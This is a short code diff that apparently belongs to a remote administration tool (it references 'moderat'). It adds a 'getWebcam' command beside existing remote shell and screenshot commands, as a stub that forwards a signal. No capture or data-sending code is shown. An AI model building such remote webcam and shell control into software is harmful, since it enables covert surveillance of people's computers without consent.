@@ -29,6 +29,7 @@ class Modes:
             'getModerators': self.getModerators,
             'shellMode': self.shellMode,
             'getScreen': self.getScreen,
+            'getWebcam': self.getWebcam,
         }
 
     def check_mode(self, data):
@@ -79,6 +80,14 @@ class Modes:
     def getScreen(self, data):
         '''
         Get Desktop Screenshot
+        :param data:
+        :return:
+        '''
+        self.moderat.send_signal(data)
+
+    def getWebcam(self, data):
+        '''
+        Get Webcamera Capture
         :param data:
         :return:
         '''
